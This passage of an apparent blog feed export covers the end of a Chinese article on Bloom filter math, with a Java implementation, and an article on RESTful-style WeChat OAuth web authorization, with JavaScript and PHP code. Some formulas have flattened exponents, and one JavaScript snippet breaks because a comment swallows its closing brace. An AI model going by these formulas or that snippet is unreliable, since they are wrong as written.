\frac{1}{2}$时错误率最小这个结果并不依赖于近似值$p$和$f$。同样对于$f’ = e^{k\ln(1 − (1 − \frac{1}{m})^{kn})}$，$g’ = k\ln(1 − (1 − \frac{1}{m})^{kn})$，$p’ = (1 − \frac{1}{m})^{kn}$，我们可以将$g’$写成</p><p style="text-align:center">$ g' = \frac{1}{n\ln(1-\frac{1}{m})}\ln(p')\ln(1-p') $</p><p>同样根据对称性法则可以得到当$p’ = \frac{1}{2}$时，$g’$取得最小值。</p><h3 id="位数组的大小"><a href="#位数组的大小" class="headerlink" title="位数组的大小"></a>位数组的大小</h3><p>下面我们来看看，在不超过一定错误率的情况下，<em>Bloom Filter</em>至少需要多少位才能表示全集中任意n个元素的集合。假设全集中共有u个元素，允许的最大错误率为є，下面我们来求位数组的位数m。</p><p>假设$X$为全集中任取n个元素的集合，$F(X)$是表示$X$的位数组。那么对于集合$X$中任意一个元素x，在$s = F(X)$中查询x都能得到肯定的结果，即s能够接受x。显然，由于<em>Bloom Filter</em>引入了错误，s能够接受的不仅仅是X中的元素，它还能够$є (u - n)$个false positive。因此，对于一个确定的位数组来说，它能够接受总共$n + є (u - n)$个元素。在$n + є (u - n)$个元素中，s真正表示的只有其中n个，所以一个确定的位数组可以表示</p><p><img src="/articles/Bloom-Filter/o_bf10.jpg" alt></p><p>个集合。m位的位数组共有2m个不同的组合，进而可以推出，m位的位数组可以表示</p><p><img src="/articles/Bloom-Filter/o_bf11.jpg" alt></p><p>个集合。全集中n个元素的集合总共有</p><p><img src="/articles/Bloom-Filter/o_bf12.jpg" alt></p><p>个，因此要让m位的位数组能够表示所有n个元素的集合，必须有</p><p><img src="/articles/Bloom-Filter/o_bf13.jpg" alt></p><p>即：</p><p><img src="/articles/Bloom-Filter/o_bf14.jpg" alt></p><p>上式中的近似前提是n和єu相比很小，这也是实际情况中常常发生的。根据上式，我们得出结论：在错误率不大于є的情况下，m至少要等于$n\log2(1/є)$才能表示任意n个元素的集合。</p><p>上一小节中我们曾算出当$k = \ln2· \frac{m}{n}$时错误率f最小，这时$f = \frac{1}{2}k = \frac{\frac{1}{2}m\ln2}{n}$。现在令$f≤є$，可以推出</p><p><img src="/articles/Bloom-Filter/o_bf15.jpg" alt></p><p>这个结果比前面我们算得的下界$n\log2(1/є)$大了$\log2 e ≈ 1.44$倍。这说明在哈希函数的个数取到最优时，要让错误率不超过є，m至少需要取到最小值的1.44倍。</p><h3 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h3><p>下面给出一个简单的<em>Bloom Filter</em>的实现代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.BitSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Very basic implementation of *Bloom Filter*.</span></span><br><span class="line"><span class="comment"> * Things to improve further.</span></span><br><span class="line"><span class="comment"> * 1. Save it on disk to make it distributed.</span></span><br><span class="line"><span class="comment"> * 2. add additional constructor to take in false positive rate and calculate other parameters.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BloomFilter</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> howManyHashFunctions =<span class="number">1</span>;</span><br><span class="line">  <span class="comment">/**How many elements are expected at max*/</span></span><br><span class="line">  <span class="keyword">int</span> totalExpectedElements ; </span><br><span class="line">  <span class="comment">/**How many elements in filter at any point in time*/</span></span><br><span class="line">  <span class="keyword">int</span> totalCurrentElements ;</span><br><span class="line">  <span class="comment">/**How many bits per  element needs to be set**/</span></span><br><span class="line">  <span class="keyword">int</span> bitsPerElement ;</span><br><span class="line">  BitSet dataDictionaryBitSet;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">BloomFilter</span><span class="params">(<span class="keyword">int</span> howManyHashFunctions,  <span class="keyword">int</span> totalExpectedElements, <span class="keyword">int</span> bitsPerElement)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.howManyHashFunctions =howManyHashFunctions;</span><br><span class="line"><span class="keyword">this</span>.totalExpectedElements =totalExpectedElements;</span><br><span class="line"><span class="keyword">this</span>.bitsPerElement=bitsPerElement;</span><br><span class="line">dataDictionaryBitSet = <span class="keyword">new</span> BitSet(bitsPerElement * totalExpectedElements);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Adding data in *Bloom Filter*. This will remember that this data was added.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> data : The data which needs to be added in *Bloom Filter***/</span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(T data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span>[] hashCodes = generateMultipleHash(data );</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> index =<span class="number">0</span> ; index&lt;hashCodes.length;++index) dataDictionaryBitSet.set(hashCodes[index]);</span><br><span class="line">++totalCurrentElements;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**Find out if given data was previously added into filter. </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> data : The data which needs to be checked if it was previously added.</span></span><br><span class="line"><span class="comment"> * **/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exists</span><span class="params">(T data)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">int</span>[] hashCodes = generateMultipleHash(data   );</span><br><span class="line"><span class="keyword">boolean</span> exists = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> index =<span class="number">0</span> ; index&lt;hashCodes.length;++index) &#123;</span><br><span class="line"><span class="keyword">if</span> (dataDictionaryBitSet.get(hashCodes[index])) exists = <span class="keyword">true</span>; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">exists = <span class="keyword">false</span>; </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> exists;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Return how many element it has remembered. **/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> totalCurrentElements;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** generate multiple hash codes</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> data the data which needs to be</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array with positive hashes with hash values from 0 to size of bit set array  size</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span>[] generateMultipleHash(T data ) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] positions = <span class="keyword">new</span> <span class="keyword">int</span>[howManyHashFunctions];</span><br><span class="line">        Random r = <span class="keyword">new</span> Random(data.hashCode());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; howManyHashFunctions; i++) &#123;</span><br><span class="line">            positions[i] = r.nextInt(dataDictionaryBitSet.size());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> positions;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在计算机科学中，我们常常会碰到时间换空间或者空间换时间的情况，即为了达到某一个方面的最优而牺牲另一个方面。<em>Bloom Filter</em>在时间空间这两个因素之外又引入了另一个因素：错误率。在使用<em>Bloom Filter</em>判断一个元素是否属于某个集合时，会有一定的错误率。也就是说，有可能把不属于这个集合的元素误认为属于这个集合（False Positive），但不会把属于这个集合的元素误认为不属于这个集合（False Negative）。在增加了错误率这个因素之后，<em>Bloom Filter</em>通过允许少量的错误来节省大量的存储空间。</p><p>自从Burton Bloom在70年代提出<em>Bloom Filter</em>之后，<em>Bloom Filter</em>就被广泛用于拼写检查和数据库系统中。近一二十年，伴随着网络的普及和发展，<em>Bloom Filter</em>在网络领域获得了新生，各种<em>Bloom Filter</em>变种和新的应用不断出现。可以预见，随着网络应用的不断深入，新的变种和应用将会继续出现，<em>Bloom Filter</em>必将获得更大的发展。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li><p><a href="http://pages.cs.wisc.edu/~cao/papers/summary-cache/node8.html" target="_blank" rel="noopener">Pei Cao. <em>Bloom Filter</em>s - the math.</a></p></li><li><p><a href="http://en.wikipedia.org/wiki/Bloom_filter" target="_blank" rel="noopener">Wikipedia. <em>Bloom Filter</em>.</a></p></li></ul><style> .fancybox img {margin:0 auto !important;}</style>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;Bloom Filter&lt;/em&gt;是一种空间效率很高的随机数据结构，它利用位数组很简洁地表示一个集合，并能判断一个元素是否属于这个集合。&lt;em&gt;Bloom Filter&lt;/em&gt;的这种高效是有一定代价的：在判断一个元素是否属于某个集合时，有可能会把不属于这个集合的元
      
    
    </summary>
    
      <category term="算法" scheme="http://ya2.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="Hash table" scheme="http://ya2.top/tags/Hash-table/"/>
    
      <category term="大数据" scheme="http://ya2.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
      <category term="BitMap" scheme="http://ya2.top/tags/BitMap/"/>
    
      <category term="转载" scheme="http://ya2.top/tags/%E8%BD%AC%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>RESTful标准下的微信网页授权</title>
    <link href="http://ya2.top/articles/RESTful%E6%A0%87%E5%87%86%E4%B8%8B%E7%9A%84%E5%BE%AE%E4%BF%A1%E7%BD%91%E9%A1%B5%E6%8E%88%E6%9D%83/"/>
    <id>http://ya2.top/articles/RESTful标准下的微信网页授权/</id>
    <published>2020-05-25T11:35:06.000Z</published>
    <updated>2021-06-16T02:21:39.279Z</updated>
    
    <content type="html"><![CDATA[<h2 id="微信网页授权流程"><a href="#微信网页授权流程" class="headerlink" title="微信网页授权流程"></a>微信网页授权流程</h2><p><img src="/articles/RESTful标准下的微信网页授权/1.png" alt="微信网页授权流程"></p><p>具体而言，可分为两步：</p><p>1、引导用户进入授权页面同意授权，获取code 【拉起授权页】 </p><blockquote><p>引导用户点击授权链接<br><a href="https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=CODE&amp;scope=SCOPE&amp;state=STATE#wechat_redirect" target="_blank" rel="noopener">https://open.weixin.qq.com/connect/oauth2/authorize?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=CODE&amp;scope=SCOPE&amp;state=STATE#wechat_redirect</a></p></blockquote><p>这里有两个参数比较注意的是：redirect_uri 授权成功后的跳转地址，授权作用域scope参数有两个值：snsapi_base和snsapi_userinfo。如果只需要获取openid则前者就够了，后者还可获取微信用户信息，前者的静默授权（不显示授权页面）功能也挺棒的。</p><p>若提示该链接无法访问，请检查参数是否填写错误，是否拥有scope参数对应的授权作用域权限。微信返回参数错误的原因一般有两种：一是在微信公众平台没有配置相应的参数；二是前端配置的接口参数与公众平台不一致。</p><p>具体参数说明</p><table><thead><tr><th align="left">参数</th><th align="left">是否必须</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">appid</td><td align="left">是</td><td align="left">公众号的唯一标识</td></tr><tr><td align="left">redirect_uri</td><td align="left">是</td><td align="left">授权后重定向的回调链接地址， 需要使用 urlencode 对链接进行处理,<code>注意这个地址必须在公众号后台网页授权域名下</code></td></tr><tr><td align="left">response_type</td><td align="left">是</td><td align="left">返回类型，填写code</td></tr><tr><td align="left">scope</td><td align="left">是</td><td align="left">应用授权作用域，snsapi_base （不弹出授权页面，直接跳转，只能获取用户openid），snsapi_userinfo （弹出授权页面，可通过openid拿到昵称、性别、所在地。并且， 即使在未关注的情况下，只要用户授权，也能获取其信息 ）</td></tr><tr><td align="left">state</td><td align="left">否</td><td align="left">重定向后会带上state参数，传递什么返回什么, 可以作为参数传递</td></tr><tr><td align="left">wechat_redirect</td><td align="left">是</td><td align="left">无论直接打开还是做页面302重定向时候，必须带此参数</td></tr></tbody></table><p>2、通过code换取网页授权access_token进而获取用户openid和其他用户信息【获取用户信息】</p><blockquote><p>获取code后，请求以下链接获取access_token<br><a href="https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code" target="_blank" rel="noopener">https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code</a></p></blockquote><p>参数说明</p><table><thead><tr><th align="left">参数</th><th align="left">是否必须</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">appid</td><td align="left">是</td><td align="left">公众号的唯一标识</td></tr><tr><td align="left">secret</td><td align="left">是</td><td align="left">公众号的appsecret</td></tr><tr><td align="left">code</td><td align="left">是</td><td align="left">填写第一步获取的code参数</td></tr><tr><td align="left">grant_type</td><td align="left">是</td><td align="left">填写为authorization_code</td></tr></tbody></table><p>正确时返回的JSON数据包如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"access_token"</span>:<span class="string">"ACCESS_TOKEN"</span>,</span><br><span class="line">  <span class="attr">"expires_in"</span>:<span class="number">7200</span>,</span><br><span class="line">  <span class="attr">"refresh_token"</span>:<span class="string">"REFRESH_TOKEN"</span>,</span><br><span class="line">  <span class="attr">"openid"</span>:<span class="string">"OPENID"</span>,</span><br><span class="line">  <span class="attr">"scope"</span>:<span class="string">"SCOPE"</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拉取用户信息(需scope为 snsapi_userinfo)</p><p>如果网页授权作用域为snsapi_userinfo，则此时开发者可以通过access_token和openid拉取用户信息了。</p><blockquote><p>http：GET（请使用https协议）<br><a href="https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN" target="_blank" rel="noopener">https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN</a></p></blockquote><p>参数说明</p><table><thead><tr><th align="left">参数</th><th align="left">是否必须</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">access_token</td><td align="left">是</td><td align="left">网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同</td></tr><tr><td align="left">openid</td><td align="left">是</td><td align="left">用户的唯一标识</td></tr><tr><td align="left">lang</td><td align="left">是</td><td align="left">返回国家地区语言版本，zh_CN 简体，zh_TW 繁体，en 英语</td></tr></tbody></table><p>正确时返回的JSON数据包如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;   </span><br><span class="line">  <span class="attr">"openid"</span>:<span class="string">" OPENID"</span>,</span><br><span class="line">  <span class="attr">"nickname"</span>: NICKNAME,</span><br><span class="line">  <span class="attr">"sex"</span>:<span class="string">"1"</span>,</span><br><span class="line">  <span class="attr">"province"</span>:<span class="string">"PROVINCE"</span>,</span><br><span class="line">  <span class="attr">"city"</span>:<span class="string">"CITY"</span>,</span><br><span class="line">  <span class="attr">"country"</span>:<span class="string">"COUNTRY"</span>,</span><br><span class="line">  <span class="attr">"headimgurl"</span>: <span class="string">"http://thirdwx.qlogo.cn/mmopen/g3MonUZtNHkdmzicIlibx6iaFqAc56vxLSUfpb6n5WKSYVY0ChQKkiaJSgQ1dZuTOgvLLrhJbERQQ4eMsv84eavHiaiceqxibJxCfHe/46"</span>,</span><br><span class="line">  <span class="attr">"privilege"</span>:[ <span class="string">"PRIVILEGE1"</span> <span class="string">"PRIVILEGE2"</span>     ],</span><br><span class="line">  <span class="attr">"unionid"</span>: <span class="string">"o6_bmasdasdsad6_2sgVt7hMZOPfL"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：unionid 只有在开发者将公众号绑定到<a href="https://open.weixin.qq.com/" target="_blank" rel="noopener">微信开放平台帐号</a>后，才会出现该字段。</p></blockquote><p>到此，微信网页授权也就结束了，更多请查看<a href="https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/Wechat_webpage_authorization.html" target="_blank" rel="noopener">微信网页授权文档</a></p><h2 id="针对RESTful规范修改"><a href="#针对RESTful规范修改" class="headerlink" title="针对RESTful规范修改"></a>针对RESTful规范修改</h2><p>现代项目开发基本上都是采用完全的前后端分离开发模式，后端采用统一规范返回json或者jsonp等给前端，而前端不再是伪静态页面，而是存粹的静态HTML,用户请求基本上都是通过ajax此类异步请求完成后端数据接收的。而在官方推荐的流程中，redirect_url被定向到后端处理接口，处理完成后使用header等强制跳转处理后的页面的方式在此处就行不通了，因为它打破了前期统一制定好的代码规范。那么 redirect_url 定向到前端页面，让前端来接收Code是否可行呢？ 答案是：可行。</p><blockquote><p>超文本标记语言（HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。HTML是一种基础技术，常与CSS、JavaScript一起被众多网站用于设计网页、网页应用程序以及移动应用程序的用户界面[3]。网页浏览器可以读取HTML文件，并将其渲染成可视化网页。HTML描述了一个网站的结构语义随着线索的呈现，使之成为一种标记语言而非编程语言。       —–<a href="https://en.wikipedia.org/wiki/HTML" target="_blank" rel="noopener">wiki</a></p></blockquote><p>我们知道html不是编程语言，是不能如php、java等编程语言那样获取用户请求参数的，但是GET请求例外,因为<code>GET参数通过URL传递</code>, 使用<code>location.href</code>或<code>location.search</code>是可以从URL中提取到GET参数的，代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getQueryVariable = <span class="function">(<span class="params">variable</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> query = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> vars = query.split(<span class="string">"&amp;"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; vars.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> pair = vars[i].split(<span class="string">"="</span>);</span><br><span class="line">        <span class="keyword">if</span> (pair[<span class="number">0</span>] === variable) &#123;</span><br><span class="line">            <span class="keyword">return</span> pair[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到正题，我们知道用户同意授权后，微信重定向时将code和state作为参数加到redirect_url链接上，也就是如下形式：</p><blockquote><p>redirect_url?code=001EX7O42pPubS00IvO42KtjO42EX7O8&amp;state</p></blockquote><p>处理过程如下：</p><p>1、我们将redirect_url定向到前端静态处理的页面A</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A.html</span><br><span class="line"><span class="comment">// 获取授权url</span></span><br><span class="line"><span class="built_in">window</span>.auth = <span class="function">(<span class="params">type</span>) =&gt;</span> &#123;</span><br><span class="line">    http(<span class="string">'wxAuthUrl'</span>, &#123;<span class="attr">type</span>: type, <span class="attr">callback</span>: location.href <span class="comment">//A.html&#125;, (response) =&gt; &#123;</span></span><br><span class="line">        location.href = response.data;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的后端接口:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 获取授权地址</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@request</span>('/wxAuthUrl')</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> array $request</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">wxAuthUrl</span><span class="params">(array $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $callback = urlencode($request[<span class="string">'callback'</span>]);<span class="comment">// redirect_url</span></span><br><span class="line">    $state = @$request[<span class="string">'type'</span>]; <span class="comment">// 根据这个值判断授权范围scope</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == $state) &#123;</span><br><span class="line">        $scope = <span class="string">"snsapi_userinfo"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $scope = <span class="string">"snsapi_base"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $url = <span class="string">"https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx552593a8e7c4b0de&amp;redirect_uri=&#123;$callback&#125;&amp;response_type=code&amp;scope=&#123;$scope&#125;&amp;state=&#123;$state&#125;#wechat_redirect"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response(<span class="number">0</span>, <span class="string">'success'</span>, $url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、页面A接收到code值以后，传递给后台</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">A.html</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> code = getQueryVariable(<span class="string">'code'</span>), state = getQueryVariable(<span class="string">'state'</span>); <span class="comment">// 获取到微信传递的code和state</span></span><br><span class="line">  <span class="keyword">if</span> (code) &#123;</span><br><span class="line">      http(<span class="string">'wxCall'</span>, &#123;<span class="attr">code</span>: code, <span class="attr">state</span>: state&#125;, (response) =&gt; &#123;<span class="comment">// 返回给后端处理</span></span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">'content'</span>).innerHTML = <span class="built_in">JSON</span>.stringify(response.data);</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、后台通过code执行授权<a href="#微信网页授权流程">步骤2</a>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 微信授权回调，原来是作为redirect_url使用的，现在修改下返回值即可满足新需求</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@request</span>('/wxCall')</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> array $request</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">wxCall</span><span class="params">(array $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// code-&gt;access_token</span></span><br><span class="line">        $ret = json_decode(file_get_contents(<span class="string">"https://api.weixin.qq.com/sns/oauth2/access_token?appid="</span> . <span class="keyword">self</span>::APPID . <span class="string">"&amp;secret="</span> . <span class="keyword">self</span>::SECRET . <span class="string">"&amp;code=&#123;$request['code']&#125;&amp;grant_type=authorization_code"</span>), <span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// access_token-&gt;profile</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1</span> == $request[<span class="string">'state'</span>]) &#123;</span><br><span class="line">            $ret = json_decode(file_get_contents(<span class="string">"https://api.weixin.qq.com/sns/userinfo?access_token=&#123;$ret['access_token']&#125;&amp;openid=&#123;$ret['openid']&#125;&amp;lang=zh_CN"</span>), <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// header("location: success.html");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response(<span class="number">0</span>, <span class="string">'success'</span>, $ret);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        <span class="comment">// header("location: fail.html");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response(<span class="number">4000</span>, $e-&gt;getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一来，整个交互过程便统一了, 效果如下：</p><p><img src="/articles/RESTful标准下的微信网页授权/3.png" alt></p><p>演示地址：<a href="https://app.ya2.top/wxauth/" target="_blank" rel="noopener">https://app.ya2.top/wxauth/</a> (建议在微信环境打开)<br>源码地址：<a href="https://github.com/gouyuwang/wxauth/" target="_blank" rel="noopener">https://github.com/gouyuwang/wxauth/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;微信网页授权流程&quot;&gt;&lt;a href=&quot;#微信网页授权流程&quot; class=&quot;headerlink&quot; title=&quot;微信网页授权流程&quot;&gt;&lt;/a&gt;微信网页授权流程&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/articles/RESTful标准下的微信网页授权/1.png&quot; a
      
    
    </summary>
    
      <category term="前端开发" scheme="http://ya2.top/categories/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="微信登录" scheme="http://ya2.top/tags/%E5%BE%AE%E4%BF%A1%E7%99%BB%E5%BD%95/"/>
    
      <category term="网页授权" scheme="http://ya2.top/tags/%E7%BD%91%E9%A1%B5%E6%8E%88%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>电商设计手册</title>
    <link href="http://ya2.top/articles/%E7%94%B5%E5%95%86%E8%AE%BE%E8%AE%A1%E6%89%8B%E5%86%8C/"/>
    <id>http://ya2.top/articles/电商设计手册/</id>
    <published>2020-05-11T10:08:33.000Z</published>
    <updated>2021-06-16T02:21:42.963Z</updated>
    
